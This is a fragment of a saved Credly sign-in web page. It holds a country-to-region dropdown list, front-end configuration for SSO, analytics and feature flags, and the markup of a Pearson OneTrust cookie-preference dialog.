                    "Taiwan": ["Hsinchu County", "Kaohsiung City", "New Taipei City", "Tainan City", "Taipei City", "Taoyuan City"],
                    "Tanzania, United Republic of": ["Arusha Region", "Dar es Salam", "Mbeya Region", "Mjini Magharibi Region"],
                    "Ukraine": ["Kharkiv Oblast", "Kyiv city", "Lviv Oblast", "Zhytomyr Oblast"],
                    "Uganda": ["Central Region", "Eastern Region", "Western Region"],
                    "United States": ["Alabama", "Alaska", "American Samoa", "Arizona", "Arkansas", "California", "California", "Colorado", "Connecticut", "Delaware", "District of Columbia", "Florida", "Georgia", "Guam", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Marshall Islands", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Palau", "Pennsylvania", "Puerto Rico", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Texas", "U.S. Virgin Islands", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"],
                    "Uruguay": ["Colonia Department", "Departamento de Canelones", "Montevideo Department"],
                    "Uzbekistan": ["Tashkent Region"],
                    "Venezuela, Bolivarian Republic of": ["Aragua", "Capital District", "Lara", "Mérida"],
                    "Vietnam": ["Binh Duong", "Da Nang", "Dong Nai", "Hai Phong", "Hanoi", "Ho Chi Minh City", "Quảng Ninh", "Soc Trang", "Thai Nguyen"],
                    "Samoa": ["Upolu"],
                    "Yemen": ["Ibb Governorate", "Sana'a City", "Ta'izz Governorate"],
                    "South Africa": ["Eastern Cape", "Free State", "Gauteng", "KwaZulu-Natal", "Limpopo", "Mpumalanga", "North West", "Western Cape"],
                    "Zambia": ["Copperbelt Province", "Lusaka Province"],
                    "Zimbabwe": ["Bulawayo Province", "Harare Province", "Mashonaland East Province", "Masvingo Province", "Midlands Province"],
            ...
            vals.sso = {
                ...
                google: {
                    clientId: "40778611547-2akc17g7rv7l4n0gfs8m9ogcn12rvl47.apps.googleusercontent.com"
                },
                microsoft: {
                    clientId: "",
            ...
            vals.tracking = JSON.parse(
                "{\"url\":\"https://stats.credly.com/stats/interaction\",\"refresh_url\":\"/stat_signatures/interaction\",\"request_data\":{\"session_id\":\"aaf02b14-06fd-4f21-a864-6973e21be54b\",\"flexible_params_auth\":[\"snapshot_json\",\"stat_object_id\",\"stat_object_type\",\"stat_type\"],\"auth_version\":\"1.0\",\"auth_key\":\"user:8d768abb-4e6a-4f38-8cb3-86dc95196f75\",\"auth_timestamp\":\"1762945092\",\"auth_signature\":\"95143d650f96595125ea19b5f20d1da9168934730de5f0a006dbe2056bfe3cee\"}}"
            );
            ...
            vals.launchDarklyOptions = {
                useReport: true
            };
            vals.launchDarklyUserContext = {
                "kind": "guest",
                "anonymous": true
            };
    ...
    <script src="./sign_credly_files/application-b4c3f73a9a4c21ed495380bfe937d7fae7c43af7095a787dfec74419bc8f2639.js.download" crossorigin="anonymous" type="module"></script>


    <div class="NotificationToaststyles__NotificationToastStack-fredly__sc-1ptg795-3 cVrUVW"></div>
    <div id="onetrust-consent-sdk" data-nosnippet="true">
        <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div>
        <div id="onetrust-pc-sdk" class="otPcCenter ot-hide ot-fade-in ot-addtl-vendors" lang="en" aria-label="Preference center" role="region">
            <div role="dialog" aria-modal="true" style="height: 100%;" aria-label="Pearson Privacy Preference Center"><!-- Close Button -->
                <div class="ot-pc-header"><!-- Logo Tag -->
                    <div class="ot-pc-logo" role="img" aria-label="Company Logo"><img alt="Company Logo" src="./sign_credly_files/logo-full-purple-4x.png"></div><button id="close-pc-btn-handler" class="ot-close-icon" aria-label="Close preference center" style="background-image: url(&quot;https://cdn.cookielaw.org/logos/static/ot_close.svg&quot;);"></button>
                </div><!-- Close Button -->
                <div id="ot-pc-content" class="ot-pc-scrollbar">
                    ...
                    <h2 id="ot-pc-title">Pearson Privacy Preference Center</h2>
                    <div id="ot-pc-desc">When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.
                        <br><a href="https://www.pearson.com/en-gb/privacy-center/privacy-notices.html" class="privacy-notice-link" rel="noopener" target="_blank" aria-label="More information about your privacy, opens in a new tab">More information</a>
                    ...
                    <section class="ot-sdk-row ot-cat-grp">
                        ...
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0001"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0001" aria-labelledby="ot-header-id-C0001 ot-status-id-C0001"></button><!-- Accordion header -->
                            ...
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                ...
                                <div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Vendor Details button opens Vendor List menu" data-parent-id="C0001">View Vendor Details‎</button></div>
                            </div>
                        </div>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0003"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0003" aria-labelledby="ot-header-id-C0003"></button><!-- Accordion header -->
                            <div class="ot-acc-hdr">
                                <div class="ot-plus-minus"><span></span><span></span></div>
                                <h4 class="ot-cat-header" id="ot-header-id-C0003">Functional Cookies</h4>
                                <div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0003" id="ot-group-id-C0003" role="switch" class="category-switch-handler" data-optanongroupid="C0003" checked="" aria-labelledby="ot-header-id-C0003"> <label class="ot-switch" for="ot-group-id-C0003"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Functional Cookies</span></label> </div>
                            </div><!-- accordion detail -->
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0003">These cookies enable the website to provide enhanced functionality and personalisation. They may be set by us or by third party providers whose services we have added to our pages.&nbsp;If you do not allow these cookies then some or all of these services may not function properly.</p>
                                <div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Vendor Details button opens Vendor List menu" data-parent-id="C0003">View Vendor Details‎</button></div>
                            </div>
                        </div>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0002"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0002" aria-labelledby="ot-header-id-C0002"></button><!-- Accordion header -->
                            <div class="ot-acc-hdr">
                                ...
                                <div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0002" id="ot-group-id-C0002" role="switch" class="category-switch-handler" data-optanongroupid="C0002" checked="" aria-labelledby="ot-header-id-C0002"> <label class="ot-switch" for="ot-group-id-C0002"><span class="ot-switch-nob"></span> <span class="ot-label-txt">Performance Cookies</span></label> </div>
                            </div><!-- accordion detail -->
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site. They help us to know which pages are the most and least popular and see how visitors move around the site. All information these cookies collect is aggregated and therefore anonymous. If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.</p>
                                <div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Vendor Details button opens Vendor List menu" data-parent-id="C0002">View Vendor Details‎</button></div>
                            </div>
                        </div>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0004"><button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0004" aria-labelledby="ot-header-id-C0004"></button><!-- Accordion header -->
                            ...
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                ...
                                <div class="ot-hlst-cntr"><button class="ot-link-btn category-host-list-handler" aria-label="Vendor Details button opens Vendor List menu" data-parent-id="C0004">View Vendor Details‎</button></div>
                            </div>
                    ...
                    L213.13,222.409z"></path>
                        ...
                        <div class="ot-lst-subhdr">
                            <div class="ot-search-cntr">
                                <p role="status" class="ot-scrn-rdr"></p><input id="vendor-search-handler" type="text" name="vendor-search-handler" placeholder="Search vendors" aria-label="Vendor list search"> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110" aria-hidden="true">
                            ...
                            <section id="ot-fltr-modal">
                                <div id="ot-fltr-cnt"><button id="clear-filters-handler">Clear</button>
                                    <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
                                        <div class="ot-fltr-opts" role="list">
                                            <div class="ot-fltr-opt" role="listitem">
